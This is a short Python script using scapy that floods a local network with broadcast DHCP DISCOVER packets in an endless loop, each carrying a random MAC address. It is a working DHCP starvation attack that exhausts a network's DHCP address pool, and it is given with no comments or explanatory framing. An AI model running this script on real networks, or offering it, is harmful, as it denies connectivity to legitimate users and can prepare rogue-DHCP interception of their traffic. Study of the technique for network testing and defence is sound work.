from scapy.all import *

conf.checkIPaddr = False

ETHER = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC())
ip = IP(src='0.0.0.0', dst='255.255.255.255')
udp = UDP(sport=68, dport=67)
bootp = BOOTP(op=1, chaddr=RandMAC())
dhcp = DHCP(options=[('message-type','discover'),('end')])

dhcp_discover = ETHER/ip/udp/bootp/dhcp


sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)
